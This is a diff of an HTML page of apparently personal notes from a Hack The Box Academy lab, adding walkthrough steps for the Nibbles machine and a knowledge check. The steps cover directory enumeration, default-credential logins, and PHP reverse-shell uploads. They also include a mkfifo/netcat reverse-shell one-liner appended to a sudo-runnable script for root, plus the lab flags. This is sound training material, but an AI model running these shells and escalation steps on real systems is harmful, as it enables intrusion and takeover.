@@ -5280,9 +5280,27 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#nibbles-web-footprinting" class="md-nav__link">
+  <a href="#nibbles-initial-foothold" class="md-nav__link">
     <span class="md-ellipsis">
-      Nibbles - Web Footprinting
+      # Nibbles - Initial Foothold
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nibbles-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nibbles - Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#knowledge-check" class="md-nav__link">
+    <span class="md-ellipsis">
+      Knowledge Check
     </span>
   </a>
   
@@ -15724,9 +15742,27 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#nibbles-web-footprinting" class="md-nav__link">
+  <a href="#nibbles-initial-foothold" class="md-nav__link">
     <span class="md-ellipsis">
-      Nibbles - Web Footprinting
+      # Nibbles - Initial Foothold
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nibbles-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nibbles - Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#knowledge-check" class="md-nav__link">
+    <span class="md-ellipsis">
+      Knowledge Check
     </span>
   </a>
   
@@ -15865,14 +15901,82 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo nmap -sC -sV $ip
 </span></code></pre></div>
 <p><strong>Results</strong>:  2.4.18</p>
-<h3 id="nibbles-web-footprinting"><a href="# Nibbles - Web Footprinting">Nibbles - Web Footprinting</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>
+<h3 id="nibbles-initial-foothold"><a href="https://academy.hackthebox.com/module/77/section/852"># Nibbles - Initial Foothold</a></h3>
+<p><strong>Gain a foothold on the target and submit the user.txt flag</strong></p>
+<p>Enumerate resources</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H &quot;HOST: $ip$&quot;
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>dirb http://$ip/nibbleblog/
 </span></code></pre></div>
-<p><strong>Results</strong>:  2.4.18</p>
+<p>There are a lot of directory listing enabled. And eventually we can browser to:
+http://$ip/nibbleblog/content/private/users.xml</p>
+<p>We can identify the user admin.</p>
+<p><img alt="admin user" src="../img/htb-nibble_00.png" /></p>
+<p>We could also enumerate http://$ip/nibbleblog/admin.php</p>
+<p>Login access is admin:nibbles.</p>
+<p>Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</p>
+<p>Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ </p>
+<p>Set a netcat listener</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>nc -lnvp 1234
+</span></code></pre></div>
+<p>Click on the reverse shell "image.php" and we will get a reverse shell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>whoami
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>#nibbler
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>cat /home/nibbler/user.txt
+</span></code></pre></div>
+<p><strong>Results</strong>:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148</p>
+<h3 id="nibbles-privilege-escalation"><a href="https://academy.hackthebox.com/module/77/section/853">Nibbles - Privilege Escalation</a></h3>
+<p>Escalate privileges and submit the root.txt flag.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>cd /home/nibbler
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>sudo -l
+</span></code></pre></div>
+<p>Results:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Matching Defaults entries for nibbler on Nibbles:
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>User nibbler may run the following commands on Nibbles:
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</span></code></pre></div>
+<p>The <code>nibbler</code> user can run the file <code>/home/nibbler/personal/stuff/monitor.sh</code> with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with <code>sudo</code> we should get a reverse shell back as the root user.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>unzip personal.zip
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>strings /home/nibbler/personal/stuff/monitor.sh
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IPattacker 8443 &gt;/tmp/f&#39; | tee -a monitor.sh
+</span></code></pre></div>
+<p>In the attacker machine, open a new netcat:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>nc -lnvp 8443
+</span></code></pre></div>
+<p>Run monitor.sh with sudo</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sudo ./monitor.sh
+</span></code></pre></div>
+<p>In the new netcat connection you are root.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cat /root/root.txt
+</span></code></pre></div>
+<p><strong>Results</strong>: de5e5d6619862a8aa5b9b212314e0cdd</p>
+<p>Alternative way: Metasploit </p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="go">exploit/multi/http/nibbleblog_file_upload</span>
+</span></code></pre></div>
+<h3 id="knowledge-check"><a href="https://academy.hackthebox.com/module/77/section/859">Knowledge Check</a></h3>
+<p><strong>Spawn the target, gain a foothold and submit the contents of the user.txt flag.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sudo nmap -sC -sV $ip
+</span></code></pre></div>
+<p>Go to http://$ip/robots.txt</p>
+<p>Go to http://$ip/admin</p>
+<p>Enter admin:admin</p>
+<p>Go to Edit Theme: http://$ip/admin/theme-edit.php</p>
+<p>Add a pentesmonkey shell and set a netcat listener on port 1234</p>
+<p>Add gettingstarte.htb to your hosts file</p>
+<p>Open the blog and you will get a reverse shell</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>cat /home/mrb3n/user.txt
+</span></code></pre></div>
+<p><strong>Results</strong>: 7002d65b149b0a4d19132a66feed21d8</p>
+<p><strong>After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.</strong></p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-06-07T18:18:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-06-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-06-08T16:29:18+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-06-08</span></small></br>
 
 
     <small>Created: May 31, 2024 18:03:27</small>
